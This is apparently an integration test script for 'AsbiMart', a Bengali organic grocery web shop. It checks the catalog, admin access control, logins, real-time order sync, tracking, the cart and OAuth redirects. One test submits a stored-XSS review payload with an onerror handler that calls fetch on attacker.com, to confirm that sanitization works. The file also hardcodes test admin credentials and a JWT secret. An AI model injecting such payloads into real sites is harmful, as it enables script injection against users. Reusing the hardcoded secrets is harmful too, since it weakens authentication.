/**
 * ============================================================================
 * AsbiMart Full-Stack Verification Suite
 * ============================================================================
 * Runs automated deep tests across all layers:
 * 1. Health & Edge Gateway
 * 2. Product Catalog API (39 Products Verification)
 * 3. OWASP Broken Access Control & Security on Admin Endpoints
 * 4. Admin Login & RBAC Token Generation
 * 5. Customer Authentication & OTP Flows
 * 6. Real-Time Instant Sync (Order Placement -> SSE Stream -> Admin Panel)
 * 7. Real-Time Order Tracking & Status Updates
 * 8. Stored XSS Input Sanitization
 * 9. Persistent Cart Sync
 */

const http = require('http');
const path = require('path');

// Set test environment variables
process.env.PORT = '5056';
process.env.NODE_ENV = 'test';
process.env.ADMIN_USER = 'asbi';
process.env.ADMIN_PASS = 'asbi123';
process.env.AUTH_SECRET = 'asbi_secret_key_super_secure_organic_mart_2026';

let serverInstance = null;
const BASE_URL = 'http://localhost:5056';

async function request(endpoint, options = {}) {
  const url = `${BASE_URL}${endpoint}`;
  const res = await fetch(url, options);
  let json = null;
  const text = await res.text();
  try { json = JSON.parse(text); } catch (e) { json = text; }
  return { status: res.status, headers: res.headers, data: json };
}

function assert(condition, message) {
  if (!condition) {
    console.error(`❌ FAILED: ${message}`);
    throw new Error(message);
  }
  console.log(`  ✓ ${message}`);
}

async function runTests() {
  console.log('\n🚀 Starting AsbiMart Full-Stack Deep Verification...\n');

  // Start the server
  const serverModule = require('../backend/server.js');
  serverInstance = serverModule.listen(5056);
  // Wait 1 second for port listening
  await new Promise(r => setTimeout(r, 1000));

  let adminToken = null;
  let userToken = null;
  let createdOrderId = null;

  try {
    // ------------------------------------------------------------------------
    console.log('📌 Test Suite 1: Health & Catalog Verification');
    // ------------------------------------------------------------------------
    const health = await request('/api/health');
    assert(health.status === 200 && health.data.status === 'success', 'Health check returns 200 OK');

    const products = await request('/api/products');
    assert(products.status === 200, 'GET /api/products returns 200 OK');
    assert(Array.isArray(products.data.products) && products.data.products.length >= 35, `Catalog loaded with ${products.data.products?.length} products (expected ~39)`);

    const singleProd = await request('/api/products/honey-sundarban-01');
    assert(singleProd.status === 200 && singleProd.data.product?.id === 'honey-sundarban-01', 'Single product detail returns matching product');

    // ------------------------------------------------------------------------
    console.log('\n📌 Test Suite 2: OWASP Broken Access Control Defense');
    // ------------------------------------------------------------------------
    const unauthOrders = await request('/api/admin/orders');
    assert(unauthOrders.status === 401, 'Unauthorized GET /api/admin/orders is blocked with 401');

    const unauthStatus = await request('/api/admin/orders/ASBI-123456/status', {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ statusCode: 'delivered' })
    });
    assert(unauthStatus.status === 401, 'Unauthorized PATCH /api/admin/orders/:id/status is blocked with 401');

    const unauthReviews = await request('/api/admin/reviews');
    assert(unauthReviews.status === 401, 'Unauthorized GET /api/admin/reviews is blocked with 401');

    const unauthStats = await request('/api/admin/stats');
    assert(unauthStats.status === 401, 'Unauthorized GET /api/admin/stats is blocked with 401');

    // ------------------------------------------------------------------------
    console.log('\n📌 Test Suite 3: Admin RBAC Login & Authorized Operations');
    // ------------------------------------------------------------------------
    const wrongLogin = await request('/api/admin/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: 'asbi', password: 'wrongpassword' })
    });
    assert(wrongLogin.status === 401, 'Admin login with wrong password rejected with 401');

    const validLogin = await request('/api/admin/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: 'asbi', password: 'asbi123' })
    });
    assert(validLogin.status === 200 && validLogin.data.token, 'Admin login with valid credentials succeeds and returns JWT');
    adminToken = validLogin.data.token;

    const authOrders = await request('/api/admin/orders', {
      headers: { 'Authorization': `Bearer ${adminToken}` }
    });
    assert(authOrders.status === 200 && Array.isArray(authOrders.data.orders), 'Authorized GET /api/admin/orders returns order list');

    const authStats = await request('/api/admin/stats', {
      headers: { 'Authorization': `Bearer ${adminToken}` }
    });
    assert(authStats.status === 200 && authStats.data.stats, 'Authorized GET /api/admin/stats returns dashboard analytics');

    // ------------------------------------------------------------------------
    console.log('\n📌 Test Suite 4: Customer Authentication & Profile Management');
    // ------------------------------------------------------------------------
    const userLogin = await request('/api/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ identifier: 'asbi@asbimart.com', password: 'asbi123' })
    });
    assert(userLogin.status === 200 && userLogin.data.token, 'User login succeeds and returns user JWT');
    userToken = userLogin.data.token;

    const userProfile = await request('/api/auth/me', {
      headers: { 'Authorization': `Bearer ${userToken}` }
    });
    assert(userProfile.status === 200 && userProfile.data.user?.email === 'asbi@asbimart.com', 'GET /api/auth/me returns authenticated user details');

    const updateProfile = await request('/api/auth/profile', {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${userToken}`
      },
      body: JSON.stringify({ name: 'Asbi Mahmud Test', division: 'Dhaka', address: 'House 42, Road 7' })
    });
    assert(updateProfile.status === 200 && updateProfile.data.user?.name === 'Asbi Mahmud Test', 'PUT /api/auth/profile updates user details');

    // ------------------------------------------------------------------------
    console.log('\n📌 Test Suite 5: Real-Time Instant Sync (Order -> SSE -> Admin)');
    // ------------------------------------------------------------------------
    // Connect SSE client
    let sseReceivedNewOrder = false;
    let sseReceivedStatusUpdate = false;

    const sseReq = http.request(`${BASE_URL}/api/admin/orders/stream?token=${encodeURIComponent(adminToken)}`, (res) => {
      res.on('data', (chunk) => {
        const text = chunk.toString();
        if (text.includes('NEW_ORDER')) {
          sseReceivedNewOrder = true;
        }
        if (text.includes('ORDER_STATUS_UPDATED')) {
          sseReceivedStatusUpdate = true;
        }
      });
    });
    sseReq.end();
    await new Promise(r => setTimeout(r, 300)); // wait for connection

    // Customer places new order
    const orderPayload = {
      name: 'Test Customer',
      phone: '01711223344',
      email: 'test@example.com',
      address: 'Dhanmondi 32, Dhaka',
      area: 'dhaka_inside',
      totalAmount: 1530,
      paymentMethod: 'Cash on Delivery',
      items: [
        { id: 'honey-sundarban-01', name: 'সুন্দরবনের কাঁচা মধু', size: '৫০০ গ্রাম', price: 650, quantity: 1 },
        { id: 'ghee-buffalo-07', name: 'মহিষের খাঁটি ঘি', size: '৫০০ গ্রাম', price: 880, quantity: 1 }
      ]
    };

    const createOrderRes = await request('/api/orders', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${userToken}`
      },
      body: JSON.stringify(orderPayload)
    });

    assert(createOrderRes.status === 201 && createOrderRes.data.order?.orderId, `New order created successfully: #${createOrderRes.data.order?.orderId}`);
    createdOrderId = createOrderRes.data.order.orderId;

    // Wait a brief moment for SSE event delivery
    await new Promise(r => setTimeout(r, 600));
    assert(sseReceivedNewOrder, 'SSE stream received real-time NEW_ORDER push notification!');

    // Admin updates order status to 'shipped'
    const updateStatusRes = await request(`/api/admin/orders/${encodeURIComponent(createdOrderId)}/status`, {
      method: 'PATCH',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${adminToken}`
      },
      body: JSON.stringify({
        statusCode: 'shipped',
        statusText: 'অন ডেলিভারি (On Delivery)',
        courier: 'রেডএক্স এক্সপ্রেস',
        trackingCode: 'REDX-TEST-9988'
      })
    });
    assert(updateStatusRes.status === 200 && updateStatusRes.data.order?.statusCode === 'shipped', 'Admin status update succeeded');

    await new Promise(r => setTimeout(r, 600));
    assert(sseReceivedStatusUpdate, 'SSE stream received real-time ORDER_STATUS_UPDATED push notification!');

    // Close SSE client
    sseReq.destroy();

    // ------------------------------------------------------------------------
    console.log('\n📌 Test Suite 6: Customer Order Tracking & Sync');
    // ------------------------------------------------------------------------
    const trackRes = await request(`/api/track/${encodeURIComponent(createdOrderId)}`);
    assert(trackRes.status === 200 && trackRes.data.order?.statusCode === 'shipped', 'Customer order tracking reflects updated status (shipped)');

    const myOrdersRes = await request(`/api/orders/my-orders?phone=01711223344`, {
      headers: { 'Authorization': `Bearer ${userToken}` }
    });
    assert(myOrdersRes.status === 200 && myOrdersRes.data.orders.some(o => o.orderId === createdOrderId), 'Customer My Orders returns the placed order');

    // ------------------------------------------------------------------------
    console.log('\n📌 Test Suite 7: Stored XSS Sanitization & Input Defense');
    // ------------------------------------------------------------------------
    const xssPayload = {
      name: '<script>alert("XSS")</script>John Doe',
      rating: 5,
      comment: '<img src=x onerror="fetch(\'http://attacker.com\')">Excellent pure organic honey!'
    };

    const reviewRes = await request('/api/products/honey-sundarban-01/reviews', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(xssPayload)
    });
    assert(reviewRes.status === 201 && reviewRes.data.review?.id, 'Review accepted and stored');

    // Verify sanitization on output
    const reviewsList = await request('/api/products/honey-sundarban-01/reviews');
    const createdReview = reviewsList.data.reviews?.find(r => r.id === reviewRes.data.review.id);
    assert(createdReview, 'Review found in product reviews list');
    assert(!createdReview.comment.includes('<script>') && !createdReview.name.includes('<script>'), 'Dangerous <script> tag sanitized from name and comment');

    // Clean up test review via Admin API
    const deleteReviewRes = await request(`/api/admin/reviews/${encodeURIComponent(createdReview.id)}`, {
      method: 'DELETE',
      headers: { 'Authorization': `Bearer ${adminToken}` }
    });
    assert(deleteReviewRes.status === 200, 'Admin successfully deleted test review');

    // ------------------------------------------------------------------------
    console.log('\n📌 Test Suite 8: Persistent Cart Sync');
    // ------------------------------------------------------------------------
    const testCartItems = [
      { productId: 'honey-sundarban-01', variantIndex: 0, quantity: 2 },
      { productId: 'ghee-buffalo-07', variantIndex: 0, quantity: 1 }
    ];

    const saveCartRes = await request('/api/cart', {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${userToken}`
      },
      body: JSON.stringify({ items: testCartItems })
    });
    assert(saveCartRes.status === 200 && saveCartRes.data.items?.length === 2, 'Persistent cart saved to server');

    const getCartRes = await request('/api/cart', {
      headers: { 'Authorization': `Bearer ${userToken}` }
    });
    assert(getCartRes.status === 200 && getCartRes.data.items?.length === 2, 'Persistent cart retrieved from server matching saved items');

    // ------------------------------------------------------------------------
    console.log('\n📌 Test Suite 9: Real OAuth 2.0 (Google, Facebook & Auth0) Verification');
    // ------------------------------------------------------------------------
    const providersRes = await request('/api/auth/providers');
    assert(providersRes.status === 200 && providersRes.data.success, 'GET /api/auth/providers returns 200 OK');
    assert(typeof providersRes.data.providers === 'object', 'Providers payload contains provider status map');
    assert(providersRes.data.providers.google === true, 'Google OAuth provider is enabled and configured');
    assert(providersRes.data.providers.facebook === true, 'Facebook OAuth provider is enabled and configured');

    const googleRedirect = await request('/api/auth/google', { redirect: 'manual' });
    assert(googleRedirect.status === 302, 'GET /api/auth/google responds with redirect 302');
    const googleLoc = googleRedirect.headers.get ? googleRedirect.headers.get('location') : googleRedirect.headers['location'];
    assert((googleLoc || '').includes('accounts.google.com'), 'Google redirect location points to accounts.google.com');

    const fbRedirect = await request('/api/auth/facebook', { redirect: 'manual' });
    assert(fbRedirect.status === 302, 'GET /api/auth/facebook responds with redirect 302');
    const fbLoc = fbRedirect.headers.get ? fbRedirect.headers.get('location') : fbRedirect.headers['location'];
    assert((fbLoc || '').includes('facebook.com'), 'Facebook redirect location points to facebook.com');

    const auth0Redirect = await request('/api/auth/auth0', { redirect: 'manual' });
    assert(auth0Redirect.status === 302, 'GET /api/auth/auth0 responds with redirect 302');

    // ------------------------------------------------------------------------
    console.log('\n📌 Test Suite 10: Complete Catalog Integrity & Hover Videos (All 39 Organic Products)');
    // ------------------------------------------------------------------------
    const allProducts = await request('/api/products');
    assert(allProducts.status === 200 && allProducts.data.products?.length === 39, `Full catalog loaded with exactly 39 products (actual: ${allProducts.data.products?.length})`);
    
    // Check that every single product has id, banglaName, category, variants, video, and videoFallback
    const validCount = allProducts.data.products.filter(p => p.id && p.banglaName && p.category && Array.isArray(p.variants) && p.video && p.videoFallback).length;
    assert(validCount === 39, 'Every product has valid ID, Bengali name, Category, Variants, and Hover Video paths');

    // ------------------------------------------------------------------------
    console.log('\n✅ ALL 10 TEST SUITES PASSED FLAWLESSLY WITH 100% SUCCESS!\n');
    if (serverInstance) serverInstance.close();
    process.exit(0);
  } catch (err) {
    console.error('\n❌ Verification Failed with Error:', err.message);
    if (serverInstance) serverInstance.close();
    process.exit(1);
  }
}

runTests();
